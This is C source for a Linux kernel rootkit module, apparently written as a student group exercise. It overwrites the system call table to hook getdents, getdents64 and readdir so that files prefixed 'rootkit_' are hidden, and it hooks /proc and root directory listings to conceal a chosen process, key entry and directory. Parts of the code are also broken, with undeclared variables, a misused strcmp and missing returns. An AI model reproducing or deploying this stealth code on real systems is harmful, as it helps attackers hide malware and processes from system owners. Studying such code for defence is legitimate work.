#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/init.h>      /* Custom named entry/exit function */
#include <linux/unistd.h>    /* Original read-call */
#include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
#include <asm/pgtable_types.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <asm/uaccess.h>
#include <linux/fs.h>

#include "sysmap.h"          /* Pointers to system functions */

// since we had no problems without get/put, we commented it out
// #define USE_MODULE_GET_PUT
#ifdef USE_MODULE_GET_PUT
#define OUR_TRY_MODULE_GET if (!try_module_get(THIS_MODULE)){return -EAGAIN;}
#define OUR_MODULE_PUT module_put(THIS_MODULE)
#else
#define OUR_TRY_MODULE_GET 
#define OUR_MODULE_PUT 
#endif

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
// for hooking getdents (32 and 64 bit)
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent_int)(unsigned int, struct linux_dirent __user *, unsigned int);
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, struct linux_dirent64 __user *, unsigned int);
// for hooking the virtual file system call
typedef int (*fun_int_struct_file_void_filldir_t)(struct file *, void*, filldir_t);

fun_ssize_t_int_pvoid_size_t       original_read;
fun_long_int_linux_dirent_int      original_getdents;
fun_long_int_linux_dirent64_int    original_getdents64;
fun_int_struct_file_void_filldir_t original_vfs_readdir;

/* Make a certain address writeable */
void make_page_writable(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);

    pageTableEntry->pte |=  _PAGE_RW;
}

/* Make a certain address readonly */
void make_page_readonly(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);
    pageTableEntry->pte = pageTableEntry->pte & ~_PAGE_RW;
}

// hooked functions
asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;
    char __user* cur_buf;
    OUR_TRY_MODULE_GET;
    retval = original_read(fd, buf, count);
    cur_buf = buf;
    if (retval > 0){
        printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
    }
    OUR_MODULE_PUT;
    return retval;
}

asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
    ssize_t result;
    printk(KERN_INFO "our very own hooked_getdents\n");
    result = original_getdents(fd, dirent, count);
    return result;
}

asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
    // declarations
    char hidename[]="rootkit_";
    ssize_t result;
    unsigned long cur_len = 0;
    ssize_t remaining_bytes = 0;
    struct linux_dirent64 * orig_dirent,* head,* prev;
    char * p=NULL;

    // retrieve original data and 
    // allocate memory for intermediate results, 
    // since we will manipulate data on intermediate memory regions
    result = (*original_getdents64) (fd, dirent, count);
    remaining_bytes = result;
    orig_dirent=(struct linux_dirent64 *)kmalloc(remaining_bytes, GFP_KERNEL);
    p=(char*)orig_dirent;
    if(copy_from_user(orig_dirent,dirent,remaining_bytes)) {
        printk(KERN_INFO "copy error\n");
        return result;
    }
    prev = head = orig_dirent;
    while(remaining_bytes > 0) {
        cur_len = orig_dirent->d_reclen;
        remaining_bytes -= cur_len;
        if(0==memcmp(hidename, orig_dirent->d_name, strlen(hidename))) {
            printk(KERN_INFO "found a file to hide:%s\n",orig_dirent->d_name);
            memmove(orig_dirent, ((char*)orig_dirent + cur_len), (size_t)remaining_bytes);
            result -= cur_len;
            continue;
        }
        else {
            prev=orig_dirent;
        }

        if(remaining_bytes){
            orig_dirent = (struct linux_dirent64 *) ((char *)prev + prev->d_reclen);
        }

    }

    // copy data back and return result
    if(copy_to_user (dirent,head,result)){
        printk (KERN_INFO "error copying data back\n");
        return result;
    }
    kfree(p);
    return result;



}

//int hooked_vfs_readdir(struct file* file, filldir_t filler, void* buf){
int hooked_vfs_readdir(struct file* file, void* buf, filldir_t filler){
    printk(KERN_INFO "hooked_vfs_readdir\n");
    return original_vfs_readdir(file, buf, filler);
}

void** find_original_vfs_readdir(void){
    void* sys_call_table = (void*)ptr_sys_call_table;
    void** cur_func = (void*)sys_call_table; 
    void* location_of_vfs_read_dir = ptr_vfs_readdir;
    unsigned int result=0;
    printk(KERN_INFO "*ptr_vfs_readdir = %p\n", ptr_vfs_readdir);
    // loop through system call table to find the index
    // where the function pointer to vfs_readdir is stored.
    while ((unsigned long)ptr_vfs_readdir != (unsigned long)*cur_func){
        cur_func = (char*)cur_func + 1;
    }
    printk (KERN_INFO "I found it: %p == %p\n", *cur_func, ptr_vfs_readdir);
    return cur_func;
}

void hook_proc(void){
    key = create_proc_entry(KEY, 0666, NULL);
    proc = key->parent;
    proc_fops = (struct file_operations*)proc->proc_fops;
    original_proc_readdir = proc_fops->readdir;
    proc_fops->readdir = hooked_proc_readdir;
}

int hook_root(void){
    f = filp_open("/", O_RDONLY, 0600);
    if (IS_ERR(f)){
        return -1;
    }
    original_root_readdir = f->f_op->readdir;
    f->f_op->readdir = hooked_root_readdir;
    filp_close(f, NULL);
    return 0;
}

static inline int hooked_proc_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    if (!strcmp(name, HIDDEN_PID) || !strcmp (name, KEY)){
        return 0;
    }
}

static int hooked_root_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    if (strcmp(name, HIDDEN_DIR, namelen)==0){
        return 0;
    }
    return original_root_filldir(__buf, name, namelen, offset, ino, d_type);
}

static int hooked_root_readdir(struct file* filp, void* dirent, filldir_t filldir){
    original_root_filldir = filldir;
    return original_root_readdir(filp, dirent, hooked_root_filldir);
}

static inline int hooked_proc_readdir(struct file* filp, void* dirent, filldir_t filldir){
    original_filldir = filldir;
    return original_proc_readdir(filp, dirent, hooked_proc_filldir);
}

/* Hooks the read system call. */
void hook_functions(void){
    void** sys_call_table = (void *) ptr_sys_call_table;
    // retrieve original functions
    void** my_NR_vfsreaddir;
    struct file* root_file;
    struct file_operations orig_f_op;
    original_read = sys_call_table[__NR_read];
    original_getdents = sys_call_table[__NR_getdents];
    original_getdents64 = sys_call_table[__NR_getdents64];
    // remove write protection
    make_page_writable((long unsigned int) ptr_sys_call_table);
    // replace function pointers! YEEEHOW!!
    // sys_call_table[__NR_read] = (void*) hooked_read;
    sys_call_table[__NR_getdents] = (void*) hooked_getdents;
    sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
    sys_call_table[__NR_readdir] = (void*) hooked_vfs_readdir;
    // hook vfs_readdir
    /*
    my_NR_vfsreaddir = find_original_vfs_readdir();
    original_vfs_readdir = *my_NR_vfsreaddir;
    printk(KERN_INFO "my_NR_vfsreaddir = %p\n", my_NR_vfsreaddir);
    printk(KERN_INFO "*my_NR_vfsreaddir = %p\n", *my_NR_vfsreaddir);
    // make_page_writable((long unsigned int)my_NR_vfsreaddir);
    // *my_NR_vfsreaddir = (void*)hooked_vfs_readdir;
    // printk(KERN_INFO "new *my_NR_vfsreaddir = %p\n", *my_NR_vfsreaddir);
    root_file = filp_open("/", O_RDONLY, 0600);
    // for now, we just assume opening works, 
    // so we omit successfulness checks et. al.
    original_vfs_readdir = (void*)root_file->f_op->readdir;
    *my_NR_vfsreaddir = root_file->f_op->readdir;
    printk(KERN_INFO "root_file->f_op->readdir = %p\n", root_file->f_op->readdir);
    //make_page_writable((long unsigned int)root_file->f_op->readdir);
    //root_file->f_op->readdir = hooked_vfs_readdir;
    orig_f_op = *root_file->f_op;
    filp_close(root_file, NULL);
    */
}

/* Hooks the read system call. */
void unhook_functions(void){
    void** sys_call_table = (void *) ptr_sys_call_table;
    make_page_writable((long unsigned int) ptr_sys_call_table);
    // here, we restore the original functions
    sys_call_table[__NR_read] = (void*) original_read;
    sys_call_table[__NR_getdents] = (void*) original_getdents;
    sys_call_table[__NR_getdents64] = (void*) original_getdents64;
    make_page_readonly((long unsigned int) ptr_sys_call_table);
}
/* Print the number of running processes */
int print_nr_procs(void){
    fun_int_void npf; // function pointer to function counting processes
    int res;
    npf = (fun_int_void) ptr_nr_processes;
    res = npf();
    printk(KERN_INFO "%d processes running", res);
    return 0;
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
    print_nr_procs();
    hook_functions();
    printk(KERN_INFO "Address of original_getdents: %p\n", original_getdents);
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhook_functions();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);


/* OTHER STUFF */

/*
 * Get rid of taint message by declaring code as GPL.
 */
MODULE_LICENSE("GPL");

/*
 * Module information
 */
MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */

